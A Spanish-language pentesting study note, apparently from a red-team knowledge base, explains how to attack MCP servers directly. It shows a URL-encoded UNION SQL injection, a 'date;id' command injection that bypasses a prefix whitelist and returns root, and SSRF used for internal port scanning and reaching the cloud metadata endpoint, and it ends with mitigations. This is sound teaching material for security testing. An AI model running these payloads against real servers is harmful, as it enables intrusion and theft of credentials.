---
tags:
  - IA/Red-Team
  - IA
  - Pentesting/Explotacion
  - Web/Red-Team
Descripción: "Un servidor MCP es un servicio que trata parámetros de red: si no los sanea, tiene SQLi, command injection y SSRF como cualquier API — y se explotan a mano, sin LLM"
Fecha de actualización: 2026-07-29
Nota previa: "[[03 - Reconocimiento de servidores MCP]]"
Nota siguiente: "[[05 - Divulgación de información y broken authorization]]"
Area: "[[MCP.base|MCP]]"
---
---

<mark style="background: #ADCCFFA6;">Un servidor MCP recibe parámetros por red y los usa para consultar bases de datos, ejecutar comandos y llamar a APIs. Si no los sanea, tiene las mismas inyecciones que cualquier servicio.</mark> La diferencia con una API web no está en las vulnerabilidades, sino en que el desarrollador **cree que el cliente es de confianza** porque hay un LLM delante — y en que se explotan **directamente**, mandando JSON-RPC a mano, sin necesidad de convencer a ningún modelo.

Ese es el punto clave repetido de todo el sub-tema: <mark style="background: #8000E1A6;">las capacidades del servidor las llama cualquiera con acceso de red, no solo el LLM. No hace falta `jailbreak`: hace falta un cliente y el `payload` correcto.</mark>

# SQL injection

Un `resource` `price://{item}` cuya descripción menciona una API delata una base de datos detrás. La prueba habitual es la comilla:

```python
try:
    r = await client.read_resource("price://banana'")
    print(r[0].text)
except Exception as e:
    print(f"[-] {e}")     # [-] ... Price API Error → posible SQLi
```

Confirmación con un comentario SQL, `price://banana'--`, que devuelve el precio normal (la comilla ya no rompe la consulta). Para explotar, sin embargo, aparece una fricción propia de MCP: **los argumentos viajan en una URI**, y una URI no admite espacios ni ciertas barras.

```text
[-] Input should be a valid URL, invalid domain character
    input_value="price://x' UNION SELECT 1--"
```

<mark style="background: #FFB86CA6;">La solución es la de siempre en web: URL-encoding.</mark> Como el servidor interactúa con una API HTTP intermedia que decodifica la URI, `%20` pasa como espacio:

```python
# price://x'%20UNION%20SELECT%201--   →  el servidor devuelve 1: UNION-based confirmada
r = await client.read_resource("price://x'%20UNION%20SELECT%201--")
```

A partir de ahí, exfiltración completa de la base de datos con las técnicas de [[00 - Introducción a SQL Injection|SQL injection]]. La única capa nueva es el encoding para meter el `payload` por la URI de MCP.

# Command injection

Un `tool` que ejecuta comandos del sistema —aun con lista blanca— es candidato a [[00 - Introducción a Command Injection|command injection]]. El de laboratorio, `execute_server_command(command)`, limita a `date`, `whoami` y `uptime`:

```python
r = await client.call_tool("execute_server_command", {"command": "date"})
```

Un comando fuera de la lista da `Invalid Command`, pero la lista blanca comprueba el comando **entero**, no lo que viene después de un separador. Los [[02 - Operadores de inyección de comandos|operadores de encadenamiento]] (`;`, `|`, `&&`, `` ` ``, `$()`) lo rompen:

```python
r = await client.call_tool("execute_server_command", {"command": "date;id"})
```

```text
Tue May 13 09:56:30 UTC 2025
uid=0(root) gid=0(root) groups=0(root)
```

<mark style="background: #FFB86CA6;">`uid=0(root)`: ejecución de comandos como `root`.</mark> El servidor MCP corría con privilegios excesivos —otro fallo frecuente— y la lista blanca era una comprobación de prefijo trivial de saltar. De aquí a un `reverse shell` hay un paso.

# Server-Side Request Forgery (SSRF)

Un `tool` que trae datos de una URL externa sin validarla es [[01 - Introducción a SSRF|SSRF]]. Se confirma apuntando a un sistema propio con un `netcat listener`:

```shell-session
$ nc -lnvp 8000
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39604
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
User-Agent: python-requests/2.32.3
```

Y se usa para escanear la red interna del servidor MCP distinguiendo puertos abiertos de cerrados por la respuesta:

- `http://127.0.0.1:80` → `Success` (puerto abierto)
- `http://127.0.0.1:22` → `Connection refused` (puerto cerrado)

Desde ahí, todo el catálogo de SSRF: acceso a servicios internos, a endpoints de metadatos de la nube (`169.254.169.254` para robar credenciales IAM), y `pivoting`. La [[05 - Evasión de defensas SSRF|evasión de defensas SSRF]] aplica igual.

> [!info]+ MCP amplifica el SSRF por diseño
> Un servidor MCP suele vivir **dentro** de la red de la organización, con acceso a servicios internos que el modelo necesita. Eso lo convierte en un pivote de SSRF privilegiado: alcanza bases de datos, APIs internas y metadatos de nube que desde fuera son inaccesibles. La propia spec de MCP dedica una sección a [SSRF en el descubrimiento de metadatos OAuth](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices) — ver [[08 - Seguridad de la autorización OAuth en MCP]].

# El patrón, no los casos

Las tres inyecciones anteriores son ejemplos; el servidor MCP puede tener cualquier vulnerabilidad de inyección. La regla general:

| Si un parámetro llega a… | Prueba… |
| - | - |
| Una consulta SQL | [[00 - Introducción a SQL Injection\|SQLi]] (con URL-encoding para la URI) |
| Un intérprete de comandos | [[00 - Introducción a Command Injection\|Command injection]] |
| Una petición HTTP saliente | [[01 - Introducción a SSRF\|SSRF]] |
| Una ruta de fichero | [[01 - Local File Inclusion (LFI)\|Path traversal / LFI]] |
| Una plantilla | [[00 - Motores de plantillas e introducción a SSTI\|SSTI]] |
| Una respuesta que vuelve al LLM | [[00 - Tratamiento inseguro de la salida del LLM\|Inyección de segundo orden vía el modelo]] |

<mark style="background: #FF5582A6;">El servidor MCP no inventa vulnerabilidades nuevas: reexpone las de siempre a un cliente que el desarrollador creyó de confianza.</mark> Por eso el pentest de un servidor MCP es, en el fondo, un pentest de API con el matiz del encoding de URIs y la ventaja de que casi nadie lo ha auditado.

# Mitigación

- **Tratar todo argumento como entrada no confiable.** Es el fallo de fondo: asumir que el LLM filtra. No filtra, y además el LLM no es el único que llama. Validación y saneado en cada capacidad.
- **Consultas parametrizadas** contra SQLi, nunca concatenación. Ver [[09 - Mitigación de SQL Injection|mitigación de SQLi]].
- **Sin `shell` para ejecutar comandos.** Usar APIs que no invoquen un intérprete (`subprocess` con lista de argumentos, no `shell=True`), y validar contra lista blanca **exacta**, no de prefijo.
- **Validación de URL** contra SSRF: lista blanca de destinos, bloqueo de rangos privados y de metadatos, y las [[06 - Prevención de SSRF|defensas SSRF]] completas.
- **Mínimo privilegio del proceso.** El `root` del ejemplo convirtió una inyección en compromiso total. El servidor MCP corre con el mínimo imprescindible y en `sandbox` si ejecuta código.
